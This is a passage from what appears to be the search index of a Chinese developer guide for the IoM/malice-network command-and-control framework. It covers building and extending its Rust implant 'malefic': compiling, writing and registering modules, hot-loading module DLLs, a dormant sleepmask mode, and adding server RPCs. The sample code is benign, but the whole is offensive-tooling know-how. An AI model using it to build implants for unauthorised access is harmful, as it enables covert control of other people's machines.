carapace.ActionFiles().Usage(\"path to error page file\")\n    comp[\"headers\"] = carapace.ActionValues().Usage(\"http headers (key=value)\")\n    comp[\"cert-name\"] = common.CertNameCompleter(con)\n})\n\n// \u6807\u8bb0\u5fc5\u9700\u53c2\u6570\nhttpCmd.MarkFlagRequired(\"listener\")\n</code></pre>"},{"location":"IoM/guideline/develop/client/#\u8865\u5168\u7cfb\u7edf\u7279\u6027","title":"\u8865\u5168\u7cfb\u7edf\u7279\u6027","text":"<ol> <li>\u591a\u7c7b\u578b\u8865\u5168: </li> <li><code>ActionValues()</code>: \u9759\u6001\u503c\u8865\u5168</li> <li><code>ActionFiles()</code>: \u6587\u4ef6\u8def\u5f84\u8865\u5168</li> <li> <p>\u81ea\u5b9a\u4e49Completer: \u52a8\u6001\u6570\u636e\u8865\u5168</p> </li> <li> <p>\u6807\u5fd7\u4f4d\u7ec4\u5408: </p> </li> <li>\u4f7f\u7528<code>common.BindFlag</code>\u7ec4\u5408\u591a\u4e2aFlagSet</li> <li> <p>\u652f\u6301\u590d\u7528\u5e38\u89c1\u6807\u5fd7\u4f4d\u7ec4\u5408</p> </li> <li> <p>\u52a8\u6001\u8865\u5168: </p> </li> <li><code>ListenerIDCompleter</code>: \u8865\u5168\u53ef\u7528\u7684\u76d1\u542c\u5668ID</li> <li><code>CertNameCompleter</code>: \u8865\u5168\u8bc1\u4e66\u540d\u79f0</li> <li> <p>\u57fa\u4e8e\u5f53\u524d\u7cfb\u7edf\u72b6\u6001\u7684\u667a\u80fd\u8865\u5168</p> </li> <li> <p>\u53c2\u6570\u9a8c\u8bc1:</p> </li> <li><code>MarkFlagRequired()</code>: \u6807\u8bb0\u5fc5\u9700\u53c2\u6570</li> <li><code>cobra.MaximumNArgs()</code>: \u53c2\u6570\u6570\u91cf\u9650\u5236</li> <li>\u81ea\u52a8\u9a8c\u8bc1\u548c\u9519\u8bef\u63d0\u793a</li> </ol>"},{"location":"IoM/guideline/develop/client/#\u9519\u8bef\u5904\u7406","title":"\u9519\u8bef\u5904\u7406","text":"<p>\u547d\u4ee4\u51fd\u6570\u5e94\u8be5\u8fd4\u56deerror\uff0c\u6846\u67b6\u4f1a\u81ea\u52a8\u5904\u7406\u9519\u8bef\u663e\u793a\uff1a</p> <pre><code>func ExampleCmd(cmd *cobra.Command, con *repl.Console) error {\n    session := con.GetInteractive()\n    if session == nil {\n        return fmt.Errorf(\"no active session\")\n    }\n\n    // ... \u547d\u4ee4\u903b\u8f91\n\n    return nil // \u6216\u8fd4\u56de\u5177\u4f53\u9519\u8bef\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#\u63d2\u4ef6\u751f\u6001","title":"\u63d2\u4ef6\u751f\u6001","text":""},{"location":"IoM/guideline/develop/client/#mal\u63d2\u4ef6","title":"Mal\u63d2\u4ef6","text":"<p>IoM\u652f\u6301\u57fa\u4e8eLua\u7684\u5ba2\u6237\u7aef\u63d2\u4ef6\uff0c\u8be6\u7ec6\u5f00\u53d1\u6307\u5357\u5c06\u5728\u72ec\u7acb\u6587\u6863\u4e2d\u63d0\u4f9b\u3002</p>"},{"location":"IoM/guideline/develop/client/#armory\u517c\u5bb9","title":"Armory\u517c\u5bb9","text":"<p>IoM\u517c\u5bb9sliver\u7684Armory\u751f\u6001\uff0c\u652f\u6301\uff1a - alias: \u547d\u4ee4\u522b\u540d\u548c\u9884\u8bbe - extension: BOF\u548c\u5176\u4ed6\u6269\u5c55</p> <p>\u8be6\u7ec6\u4f7f\u7528\u65b9\u6cd5\u53c2\u8003Armory\u751f\u6001\u6587\u6863\u3002</p>"},{"location":"IoM/guideline/develop/client/#\u76f8\u5173\u8d44\u6e90","title":"\u76f8\u5173\u8d44\u6e90","text":"<ul> <li>IoM\u8bbe\u8ba1\u6587\u6863 - \u4e86\u89e3\u6574\u4f53\u67b6\u6784</li> <li>Mal\u63d2\u4ef6\u6587\u6863 - \u63d2\u4ef6\u5f00\u53d1\u8be6\u7ec6\u6307\u5357</li> <li>Server\u5f00\u53d1\u6307\u5357 - \u670d\u52a1\u7aef\u5f00\u53d1</li> <li>Implant\u5f00\u53d1\u6307\u5357 - \u690d\u5165\u7269\u5f00\u53d1</li> <li>Armory\u751f\u6001 - Sliver\u63d2\u4ef6\u751f\u6001</li> </ul> <p>\u2b05\ufe0f \u8fd4\u56de\u5f00\u53d1\u8005\u6307\u5357</p>"},{"location":"IoM/guideline/develop/implant/","title":"Implant \u5f00\u53d1\u6307\u5357","text":"<p>\u672c\u6307\u5357\u4ecb\u7ecd\u5982\u4f55\u4e3aIoM\u7684Implant\u7ec4\u4ef6\u8fdb\u884c\u5f00\u53d1\u548c\u8d21\u732e\u3002Implant\u662f\u57fa\u4e8eRust\u7684\u8de8\u5e73\u53f0\u690d\u5165\u7269\u3002</p> <p>\u56de\u5230\u603b\u89c8</p> <p>\u8fd4\u56de\u5f00\u53d1\u8005\u8d21\u732e\u6307\u5357 | \u67e5\u770bServer\u5f00\u53d1\u6307\u5357 | \u67e5\u770bClient\u5f00\u53d1\u6307\u5357</p>"},{"location":"IoM/guideline/develop/implant/#\u73af\u5883\u914d\u7f6e","title":"\u73af\u5883\u914d\u7f6e","text":""},{"location":"IoM/guideline/develop/implant/#rust\u5f00\u53d1\u73af\u5883","title":"Rust\u5f00\u53d1\u73af\u5883","text":"<p>\u7248\u672c\u8981\u6c42: nightly-2023-09-18-x86_64-pc-windows-msvc</p> <p>\u9501\u5b9a\u7248\u672c\u8981\u6c42</p> <p>\u4e3a\u4e86\u4fdd\u6301\u5bf9Windows 7\u7684\u517c\u5bb9\u6027\uff0ccommunity\u7248\u672c\u9501\u5b9a\u4e86rust toolchain\u7248\u672c</p> <pre><code>rustup default nightly-2023-09-18-x86_64-pc-windows-msvc\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#\u652f\u6301\u7684\u76ee\u6807\u67b6\u6784","title":"\u652f\u6301\u7684\u76ee\u6807\u67b6\u6784","text":"<p>malefic\u7406\u8bba\u4e0a\u652f\u6301rust\u80fd\u7f16\u8bd1\u7684\u51e0\u4e4e\u6240\u6709\u5e73\u53f0\uff0c\u5f53\u524d\u6d4b\u8bd5\u8fc7\u7684target\uff1a</p> <ul> <li>x86_64-apple-darwin</li> <li>aarch64-apple-darwin  </li> <li>x86_64-unknown-linux-musl</li> <li>i686-unknown-linux-musl</li> <li>x86_64-pc-windows-msvc</li> <li>i686-pc-windows-msvc</li> <li>x86_64-pc-windows-gnu</li> <li>i686-pc-windows-gnu</li> <li>armv7-unknown-linux-musleabihf</li> <li>armv7-unknown-linux-musleabi</li> </ul> <p>\u8be6\u7ec6\u67b6\u6784\u652f\u6301\u53c2\u8003cross-rust</p>"},{"location":"IoM/guideline/develop/implant/#\u9879\u76ee\u8bbe\u7f6e","title":"\u9879\u76ee\u8bbe\u7f6e","text":"<ol> <li>\u514b\u9686\u4ed3\u5e93 (\u5fc5\u987b\u9012\u5f52\u514b\u9686\u5b50\u9879\u76ee)    <pre><code>git clone --recurse-submodules https://github.com/chainreactors/malefic\ncd malefic\n</code></pre></li> </ol> <p>!!! warning \"\u5fc5\u987b\u9012\u5f52\u514b\u9686\"        IoM\u9879\u76ee\u5305\u542b\u591a\u4e2a\u5b50\u6a21\u5757\uff0c\u5fc5\u987b\u4f7f\u7528<code>--recurse-submodules</code>\u53c2\u6570\u3002\u5982\u679c\u5df2\u7ecfclone\u4f46\u6ca1\u6709\u5b50\u6a21\u5757\uff0c\u8fd0\u884c<code>git submodule update --init --recursive</code>\u8865\u5145\u4e0b\u8f7d\u3002</p> <ol> <li>\u4e0b\u8f7dresources</li> </ol> <p>\u4e0b\u8f7d\u5bf9\u5e94\u7248\u672c\u7684resources.zip\uff0c\u5305\u542b\u4e86\u7f16\u8bd1\u9700\u8981\u7684\u9884\u7f16\u8bd1malefic-win-kit lib/a\u5e93\u6587\u4ef6\u3002</p> <p>\u89e3\u538b\u5230\u6e90\u7801\u76ee\u5f55\u4e0b\u7684resources\u6587\u4ef6\u5939\u3002</p>"},{"location":"IoM/guideline/develop/implant/#\u672c\u673a\u7f16\u8bd1\u73af\u5883","title":"\u672c\u673a\u7f16\u8bd1\u73af\u5883","text":""},{"location":"IoM/guideline/develop/implant/#\u5b89\u88c5rust","title":"\u5b89\u88c5Rust","text":"LinuxWindows <pre><code>curl https://sh.rustup.rs -sSf | sh\n</code></pre> <p>\u4e09\u79cd\u65b9\u5f0f\u9009\u4e00: <pre><code># 1. \u76f4\u63a5\u4e0b\u8f7d: https://www.rust-lang.org/tools/install\n# 2. scoop\nscoop install rustup\n# 3. winget  \nwinget install rustup\n</code></pre></p>"},{"location":"IoM/guideline/develop/implant/#\u5b89\u88c5\u9501\u5b9atoolchain","title":"\u5b89\u88c5\u9501\u5b9atoolchain","text":"<pre><code>rustup default nightly-2023-09-18\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#\u73af\u5883\u4f9d\u8d56","title":"\u73af\u5883\u4f9d\u8d56","text":"LinuxWindows <pre><code>sudo apt install -y openssl libssl-dev libudev-dev cmake llvm clang musl-tools build-essential\n</code></pre> <p>\u6839\u636etarget\u9009\u62e9\u914d\u7f6emsvc\u6216gnu\u73af\u5883\uff0c\u8be6\u7ec6\u6b65\u9aa4\u53c2\u8003build\u6587\u6863</p> <p>\u4ea4\u53c9\u7f16\u8bd1\u5c0f\u6280\u5de7</p> <p>\u4f7f\u7528zigbuild\u53ef\u4ee5\u7b80\u5316\u4ea4\u53c9\u7f16\u8bd1\uff1a <pre><code>pip install cargo-zigbuild\ncargo zigbuild --release -p malefic --target x86_64-pc-windows-gnu\n</code></pre></p>"},{"location":"IoM/guideline/develop/implant/#\u7f16\u8bd1\u6d4b\u8bd5","title":"\u7f16\u8bd1\u6d4b\u8bd5","text":"<pre><code># \u6dfb\u52a0\u76ee\u6807\u67b6\u6784\nrustup target add x86_64-pc-windows-gnu\n\n# \u7f16\u8bd1\u6d4b\u8bd5\ncargo build --release -p malefic --target x86_64-pc-windows-gnu\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#module\u5f00\u53d1","title":"Module\u5f00\u53d1","text":""},{"location":"IoM/guideline/develop/implant/#module\u793a\u4f8b","title":"Module\u793a\u4f8b","text":"<p>\u4ee5\u73af\u5883\u53d8\u91cf\u64cd\u4f5c\u529f\u80fd\u4e3a\u4f8b\u7f16\u5199Module:</p>"},{"location":"IoM/guideline/develop/implant/#1-\u7b80\u5355module-\u73af\u5883\u53d8\u91cf\u83b7\u53d6","title":"1. \u7b80\u5355Module (\u73af\u5883\u53d8\u91cf\u83b7\u53d6)","text":"<pre><code>use crate::prelude::*;\n\npub struct Env {}\n\n#[async_trait]\n#[module_impl(\"env\")]\nimpl Module for Env {}\n\n#[async_trait]\nimpl ModuleImpl for Env {\n    async fn run(&amp;mut self, id: u32, receiver: &amp;mut malefic_proto::module::Input, _sender: &amp;mut malefic_proto::module::Output) -&gt; ModuleResult {\n        let _ = check_request!(receiver, Body::Request)?;\n\n        let mut env_response = Response::default();\n        for (key, value) in std::env::vars() {\n            env_response.kv.insert(key, value);\n        }\n\n        Ok(TaskResult::new_with_body(id, Body::Response(env_response)))\n    }\n}\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#2-\u5e26\u53c2\u6570module-\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","title":"2. \u5e26\u53c2\u6570Module (\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf)","text":"<pre><code>pub struct Setenv {}\n\n#[async_trait]\n#[module_impl(\"env_set\")]\nimpl Module for Setenv {}\n\n#[async_trait]\nimpl ModuleImpl for Setenv {\n    async fn run(&amp;mut self, id: u32, receiver: &amp;mut malefic_proto::module::Input, _sender: &amp;mut malefic_proto::module::Output) -&gt; ModuleResult {\n        let request = check_request!(receiver, Body::Request)?;\n\n        let args = check_field!(request.args, 2)?; // \u6821\u9a8cargs\u53c2\u6570\u957f\u5ea6\u4e3a2\n        if let [k, v] = &amp;args[..] {\n            std::env::set_var(k, v);\n        }\n\n        Ok(TaskResult::new(id)) // \u8fd4\u56de\u7b80\u5355\u6210\u529f\u7ed3\u679c\n    }\n}\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#module\u6ce8\u518c","title":"Module\u6ce8\u518c","text":"<p>\u8981\u5c06\u6a21\u5757\u96c6\u6210\u5230malefic\u4e2d\uff0c\u9700\u8981\u8fdb\u884c\u6a21\u5757\u6ce8\u518c\uff1a</p>"},{"location":"IoM/guideline/develop/implant/#1-\u5728cargotoml\u4e2d\u6dfb\u52a0feature","title":"1. \u5728Cargo.toml\u4e2d\u6dfb\u52a0Feature","text":"<p>\u5728malefic-modules/Cargo.toml\u4e2d\u6dfb\u52a0feature\uff1a</p> <pre><code>[features]\n# ... \u5176\u4ed6features\nenv = []\nenv_set = []  \nenv_unset = []\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#2-\u5728librs\u4e2d\u6ce8\u518c\u6a21\u5757","title":"2. \u5728lib.rs\u4e2d\u6ce8\u518c\u6a21\u5757","text":"<p>\u5728malefic-modules/src/lib.rs\u4e2d\u6ce8\u518c\u6a21\u5757\uff1a</p> <pre><code>// \u5bfc\u5165\u6a21\u5757\n#[cfg(feature = \"env\")]\npub mod env;\n\n// \u5728register_modules\u51fd\u6570\u4e2d\u6ce8\u518c\npub fn register_modules() -&gt; MaleficModules {\n    let mut modules: MaleficModules = HashMap::new();\n\n    #[cfg(feature = \"env\")]\n    register_module!(modules, \"env\", env::Env);\n\n    #[cfg(feature = \"env_set\")]  \n    register_module!(modules, \"env_set\", env::Setenv);\n\n    #[cfg(feature = \"env_unset\")]\n    register_module!(modules, \"env_unset\", env::Unsetenv);\n\n    modules\n}\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#3-\u6a21\u5757\u6587\u4ef6\u7ed3\u6784","title":"3. \u6a21\u5757\u6587\u4ef6\u7ed3\u6784","text":"<pre><code>malefic-modules/src/\n\u251c\u2500\u2500 lib.rs          # \u6a21\u5757\u6ce8\u518c\u5165\u53e3\n\u251c\u2500\u2500 env/\n\u2502   \u2514\u2500\u2500 mod.rs      # \u73af\u5883\u53d8\u91cf\u76f8\u5173\u6a21\u5757\n\u2514\u2500\u2500 ...\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#\u7f16\u8bd1\u72ec\u7acbmodules","title":"\u7f16\u8bd1\u72ec\u7acbmodules","text":"<p>malefic\u652f\u6301\u52a8\u6001\u52a0\u8f7dmodule\uff0c\u53ef\u4ee5\u7f16\u8bd1\u5355\u4e2a\u6216\u4e00\u7ec4module\uff1a</p> <pre><code># \u751f\u6210\u914d\u7f6e\nmalefic_mutant generate modules \"execute_powershell execute_assembly\"\n\n# \u7f16\u8bd1modules\nmalefic_mutant build modules --target x86_64-pc-windows-gnu\n</code></pre> <p>\u7f16\u8bd1\u7ed3\u679c\u4e3a<code>target/[arch]/release/modules.dll</code>\uff0c\u53ef\u4ee5\u4f7f\u7528<code>load_module</code>\u70ed\u52a0\u8f7d\u3002</p> <p>\u52a8\u6001\u52a0\u8f7d\u9650\u5236</p> <p>Module\u52a8\u6001\u52a0\u8f7d\u76ee\u524d\u53ea\u652f\u6301Windows\uff0cLinux\u4e0emacOS\u5c06\u968f\u7740\u5bf9\u5e94\u7684kit\u53d1\u5e03</p>"},{"location":"IoM/guideline/develop/implant/#\u5e38\u89c1\u4f7f\u7528\u573a\u666f","title":"\u5e38\u89c1\u4f7f\u7528\u573a\u666f","text":"<ol> <li>\u7f16\u8bd1\u4e00\u4e2a\u4e0d\u5e26\u4efb\u4f55modules\u7684malefic\uff0c\u4fdd\u6301\u6700\u5c0f\u7279\u5f81\u4e0e\u4f53\u79ef</li> <li>\u6839\u636e\u573a\u666f\u5feb\u901f\u5f00\u53d1module\uff0c\u7136\u540e\u52a8\u6001\u52a0\u8f7d\u5230malefic\u4e2d</li> <li>\u957f\u65f6\u95f4\u9759\u9ed8\u573a\u666f\u53ef\u4ee5\u5378\u8f7d\u6240\u6709modules\uff0c\u8fdb\u5165sleepmask\u72b6\u6001</li> </ol>"},{"location":"IoM/guideline/develop/implant/#3rd-module\u5f00\u53d1","title":"3<sup>rd</sup> Module\u5f00\u53d1","text":"<p>\u5bf9\u4e8e\u9700\u8981\u5f15\u5165\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7684\u6a21\u5757\uff0cIoM\u63d0\u4f9b\u4e86\u4e13\u95e8\u76843rd module\u5f00\u53d1\u6846\u67b6\u3002\u5728Malefic\u672c\u4f53\u4e2d\u91c7\u7528\u4e86\u6700\u5c0f\u5316\u4f9d\u8d56\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u56e0\u6b64\u6240\u6709\u9700\u8981\u7b2c\u4e09\u65b9\u5e93\u7684\u529f\u80fd\u90fd\u57283rd\u6a21\u5757\u4e2d\u5b9e\u73b0\u3002</p>"},{"location":"IoM/guideline/develop/implant/#\u4f7f\u7528\u6a21\u677f\u521b\u5efa3rd\u6a21\u5757","title":"\u4f7f\u7528\u6a21\u677f\u521b\u5efa3rd\u6a21\u5757","text":"<ol> <li> <p>\u514b\u9686\u6a21\u677f\u4ed3\u5e93 <pre><code>git clone https://github.com/chainreactors/malefic-3rd-template.git\ncd malefic-3rd-template\n</code></pre></p> </li> <li> <p>\u9879\u76ee\u7ed3\u6784 <pre><code>malefic-3rd-template/\n\u251c\u2500\u2500 Cargo.toml           # \u9879\u76ee\u914d\u7f6e\u6587\u4ef6\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 lib.rs          # \u4e3b\u5e93\u6587\u4ef6\uff0c\u6a21\u5757\u6ce8\u518c\u5165\u53e3\n\u2502   \u251c\u2500\u2500 prelude.rs      # \u516c\u5171\u5bfc\u5165\n\u2502   \u2514\u2500\u2500 example/        # \u793a\u4f8b\u6a21\u5757\n\u2502       \u2514\u2500\u2500 mod.rs      # \u793a\u4f8b\u6a21\u5757\u5b9e\u73b0\n\u2514\u2500\u2500 README.md\n</code></pre></p> </li> <li> <p>\u6784\u5efa\u6a21\u5757 <pre><code>cargo build -r\n</code></pre></p> </li> </ol> <p>\u6784\u5efa\u5b8c\u6210\u540e\uff0cDLL\u6587\u4ef6\u4f4d\u4e8e<code>target/release/malefic_3rd.dll</code></p> <ol> <li>\u52a0\u8f7d\u6a21\u5757 <pre><code># \u5728IoM client\u4e2d\u6267\u884c\nload_module --path target/release/malefic_3rd.dll\n</code></pre></li> </ol>"},{"location":"IoM/guideline/develop/implant/#\u5f00\u53d1\u81ea\u5b9a\u4e493rd\u6a21\u5757","title":"\u5f00\u53d1\u81ea\u5b9a\u4e493rd\u6a21\u5757","text":""},{"location":"IoM/guideline/develop/implant/#1-\u6dfb\u52a0\u65b0\u6a21\u5757","title":"1. \u6dfb\u52a0\u65b0\u6a21\u5757","text":"<p>\u521b\u5efa\u6a21\u5757\u76ee\u5f55\u548c\u6587\u4ef6\uff1a <pre><code>src/your_module/\n\u2514\u2500\u2500 mod.rs\n</code></pre></p>"},{"location":"IoM/guideline/develop/implant/#2-\u914d\u7f6efeatures","title":"2. \u914d\u7f6eFeatures","text":"<p>\u5728<code>Cargo.toml</code>\u4e2d\u6dfb\u52a0feature\uff1a <pre><code>[features]\ndefault = [\"as_cdylib\", \"example\"]\nas_cdylib = []\nexample = []\nyour_module = []  # \u65b0\u589e\u6a21\u5757feature\n</code></pre></p>"},{"location":"IoM/guideline/develop/implant/#3-\u6ce8\u518c\u6a21\u5757","title":"3. \u6ce8\u518c\u6a21\u5757","text":"<p>\u5728<code>src/lib.rs</code>\u4e2d\u6ce8\u518c\u6a21\u5757\uff1a <pre><code>pub mod your_module;\n\npub extern \"C\" fn register_3rd() -&gt; MaleficBundle {\n    let mut map: MaleficBundle = HashMap::new();\n\n    #[cfg(feature = \"example\")]\n    register_module!(map, \"example\", example::Example);\n\n    #[cfg(feature = \"your_module\")]\n    register_module!(map, \"your_module\", your_module::YourModule);\n\n    map\n}\n</code></pre></p>"},{"location":"IoM/guideline/develop/implant/#4-\u5b9e\u73b0\u6a21\u5757","title":"4. \u5b9e\u73b0\u6a21\u5757","text":"<pre><code>use crate::prelude::*;\n\npub struct YourModule {}\n\n#[async_trait]\n#[module_impl(\"your_module\")]\nimpl Module for YourModule {}\n\n#[async_trait]\nimpl ModuleImpl for YourModule {\n    async fn run(&amp;mut self, id: u32, receiver: &amp;mut crate::Input, sender: &amp;mut crate::Output) -&gt; ModuleResult {\n        let request = check_request!(receiver, Body::Request)?;\n\n        // \u5904\u7406\u8bf7\u6c42\u903b\u8f91...\n\n        let mut response = Response::default();\n        response.output = \"your module output\".to_string();\n        Ok(TaskResult::new_with_body(id, Body::Response(response)))\n    }\n}\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#\u9009\u62e9\u6027\u6784\u5efa","title":"\u9009\u62e9\u6027\u6784\u5efa","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9afeatures\u6765\u9009\u62e9\u6027\u6784\u5efa\u6a21\u5757\uff1a</p> <pre><code># \u53ea\u6784\u5efaexample\u6a21\u5757\ncargo build -r --features \"example\"\n\n# \u6784\u5efa\u591a\u4e2a\u6a21\u5757\ncargo build -r --features \"example,your_module\"\n</code></pre>"},{"location":"IoM/guideline/develop/implant/#3rd\u6a21\u5757\u4e0e\u666e\u901a\u6a21\u5757\u7684\u533a\u522b","title":"3rd\u6a21\u5757\u4e0e\u666e\u901a\u6a21\u5757\u7684\u533a\u522b","text":"<ul> <li>\u666e\u901a\u6a21\u5757: \u7f16\u8bd1\u65f6\u9759\u6001\u94fe\u63a5\u5230malefic\u672c\u4f53\uff0c\u4e0d\u80fd\u4f7f\u7528\u7b2c\u4e09\u65b9\u4f9d\u8d56</li> <li>3rd\u6a21\u5757: \u72ec\u7acb\u7f16\u8bd1\u4e3a\u52a8\u6001\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u7b2c\u4e09\u65b9\u4f9d\u8d56\uff0c\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d</li> </ul>"},{"location":"IoM/guideline/develop/implant/#\u76f8\u5173\u8d44\u6e90","title":"\u76f8\u5173\u8d44\u6e90","text":"<ul> <li>Implant\u6784\u5efa\u6587\u6863 - \u8be6\u7ec6\u7f16\u8bd1\u6307\u5357</li> <li>Module\u6587\u6863 - \u6240\u6709\u53ef\u7528\u6a21\u5757</li> <li>Mutant\u6587\u6863 - \u914d\u7f6e\u5de5\u5177\u8be6\u89e3</li> <li>Server\u5f00\u53d1\u6307\u5357 - \u670d\u52a1\u7aef\u5f00\u53d1</li> <li>Client\u5f00\u53d1\u6307\u5357 - \u5ba2\u6237\u7aef\u5f00\u53d1</li> </ul> <p>\u2b05\ufe0f \u8fd4\u56de\u5f00\u53d1\u8005\u6307\u5357</p>"},{"location":"IoM/guideline/develop/server/","title":"Server \u5f00\u53d1\u6307\u5357","text":"<p>\u672c\u6307\u5357\u4ecb\u7ecd\u5982\u4f55\u4e3aIoM\u7684Server\u7ec4\u4ef6\u8fdb\u884c\u5f00\u53d1\u548c\u8d21\u732e\u3002Server\u662fIoM\u7684\u6838\u5fc3\u6570\u636e\u5904\u7406\u548c\u4ea4\u4e92\u670d\u52a1\u3002</p> <p>\u56de\u5230\u603b\u89c8</p> <p>\u8fd4\u56de\u5f00\u53d1\u8005\u8d21\u732e\u6307\u5357 | \u67e5\u770bClient\u5f00\u53d1\u6307\u5357 | \u67e5\u770bImplant\u5f00\u53d1\u6307\u5357</p>"},{"location":"IoM/guideline/develop/server/#\u73af\u5883\u914d\u7f6e","title":"\u73af\u5883\u914d\u7f6e","text":"<p>\u73af\u5883\u914d\u7f6eclient\u4e0eserver\u5b8c\u5168\u4e00\u81f4\uff0c \u6309\u9700\u53d6\u7528</p> Go\u5f00\u53d1\u73af\u5883 <p>\u7248\u672c\u8981\u6c42: Go &gt;= 1.20</p> <p>\u63a8\u8350golang 1.20</p> <p>golang 1.20\u662f\u517c\u5bb9Win7\u7684\u6700\u540e\u4e00\u4e2a\u7248\u672c</p> <pre><code>go version\n</code></pre> protobuf\u73af\u5883 LinuxmacOSWindows <p>\u4f7f\u7528 <code>apt</code> \u6216 <code>apt-get</code>: <pre><code>apt install -y protobuf-compiler \nprotoc --version  # \u786e\u4fdd\u7248\u672c &gt;= 3\n</code></pre></p> <p>\u4f7f\u7528 Homebrew: <pre><code>brew install protobuf\nprotoc --version\n</code></pre></p> <p>\u4f7f\u7528 Winget: <pre><code>winget install protobuf \nprotoc --version\n</code></pre></p> <p>protobuf Go\u63d2\u4ef6 (\u6307\u5b9a\u7248\u672c) <pre><code>go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.3.0  \ngo install google.golang.org/protobuf/cmd/protoc-gen-go@v1.34.1  \n</code></pre></p> <p>\u53c2\u8003\u5b98\u65b9\u6587\u6863</p> <p>\u66f4\u591a\u5b89\u88c5\u9009\u9879\u8bf7\u53c2\u8003 protobuf.dev/installation</p> \u9879\u76ee\u8bbe\u7f6e <ol> <li> <p>Fork\u5e76\u514b\u9686\u4ed3\u5e93 <pre><code>git clone --recurse-submodules https://github.com/your-username/malice-network.git\ncd malice-network\ngit remote add upstream https://github.com/chainreactors/malice-network.git\n</code></pre></p> </li> <li> <p>\u5b89\u88c5\u4f9d\u8d56 <pre><code>go mod tidy\n</code></pre></p> </li> <li> <p>\u751f\u6210protobuf\u6587\u4ef6 (\u5982\u679c\u4fee\u6539\u4e86proto\u5b9a\u4e49)    <pre><code>go generate ./client\n</code></pre></p> </li> <li> <p>\u7f16\u8bd1server <pre><code>go build ./server/\n</code></pre></p> </li> </ol>"},{"location":"IoM/guideline/develop/server/#\u5f00\u53d1\u5b9e\u8df5","title":"\u5f00\u53d1\u5b9e\u8df5","text":""},{"location":"IoM/guideline/develop/server/#\u6269\u5c55proto\u534f\u8bae","title":"\u6269\u5c55Proto\u534f\u8bae","text":"<p>\u4e3a\u4e86\u9002\u7528\u5927\u90e8\u5206\u573a\u666f\u4e2d\uff0c \u6211\u4eec\u6dfb\u52a0\u4e24\u4e2a\u8f83\u4e3a\u901a\u7528\u7684proto\u3002\u9002\u914d\u7edd\u5927\u90e8\u5206\u573a\u666f\uff0c \u5982\u679c\u53ef\u4ee5\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\uff0c \u8bf7\u4f18\u5148\u4f7f\u7528\u8fd9\u4e24\u4e2aproto</p> <pre><code>message Request {  \n  string name = 1;  \n  string input = 2;  \n  repeated string args = 3;  \n  map&lt;string, string&gt; params = 4;  \n  bytes bin = 5;  \n}  \n\nmessage Response {  \n  string output = 1;  \n  string error = 2;  \n  map&lt;string, string&gt; kv = 3;  \n  repeated string array =4;  \n}\n</code></pre> <p>\u5982\u679c\u8fd9\u4e24\u4e2a\u901a\u7528\u7684proto\u65e0\u6cd5\u6ee1\u8db3\uff0c \u624d\u9700\u8981\u8003\u8651\u4fee\u6539proto</p> <ol> <li>\u4fee\u6539proto\u6587\u4ef6</li> </ol> <p>\u5728<code>proto/implant/implantpb/implant.proto</code>\u4e2d\u6dfb\u52a0\u65b0\u7684message\uff1a</p> <pre><code>message NewCommand {\n    string param = 1; \n}\n</code></pre> <p>\u5c06message\u6dfb\u52a0\u5230Spite\u7684body oneof\u4e2d\uff1a</p> <pre><code>message Spite {  \n  // ... \u5176\u4ed6\u5b57\u6bb5\n  oneof body {  \n    // ... \u5176\u4ed6\u6d88\u606f\u7c7b\u578b\n    NewCommand new_command = 999;    \n  }\n}\n</code></pre> <ol> <li>\u4fee\u6539server\u5e38\u91cf</li> </ol> <p>\u5728<code>helper/types/message.go</code>\u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>MsgNewCommand MsgName = \"new_command\"\n</code></pre> <p>\u5728<code>buildSpite</code>\u4e2d\u6dfb\u52a0\u5bf9\u5e94\u7684message\u5904\u7406\uff1a</p> <pre><code>case *implantpb.NewCommand:\n   spite.Name = MsgNewCommand.String()\n   spite.Body = &amp;implantpb.Spite_NewCommand{NewCommand: msg.(*implantpb.NewCommand)} \n</code></pre> <ol> <li>\u6dfb\u52a0protobuf rpc</li> </ol> <p>\u5728<code>proto/services/clientrpc/service.proto</code>\u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>service MaliceRPC {  \n  // ... \u5176\u4ed6RPC\n  rpc NewCommandRpc(implantpb.NewCommand) returns (clientpb.Task);\n}\n</code></pre>"},{"location":"IoM/guideline/develop/server/#\u6dfb\u52a0\u65b0\u7684rpc\u63a5\u53e3","title":"\u6dfb\u52a0\u65b0\u7684RPC\u63a5\u53e3","text":"<p>Server\u7aef\u63d0\u4f9b\u4e24\u79cd\u7c7b\u578b\u7684RPC\u5b9e\u73b0\uff1a\u666e\u901aRPC\u548c\u6d41\u5f0fRPC\u3002</p>"},{"location":"IoM/guideline/develop/server/#1-\u666e\u901arpc","title":"1. \u666e\u901aRPC","text":"<p>\u9002\u7528\u4e8e\u7b80\u5355\u7684\u8bf7\u6c42-\u54cd\u5e94\u6a21\u5f0f\uff1a</p> <pre><code>func (rpc *Server) NewCommand(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {\n    greq, err := newGenericRequest(ctx, req)\n    if err != nil {\n        return nil, err\n    }\n    ch, err := rpc.asyncGenericHandler(ctx, greq)\n    if err != nil {\n        return nil, err\n    }\n\n    go greq.HandlerAsyncResponse(ch, types.MsgResponse)\n    return greq.Task.ToProtobuf(), nil\n}\n</code></pre>"},{"location":"IoM/guideline/develop/server/#2-\u6d41\u5f0frpc","title":"2. 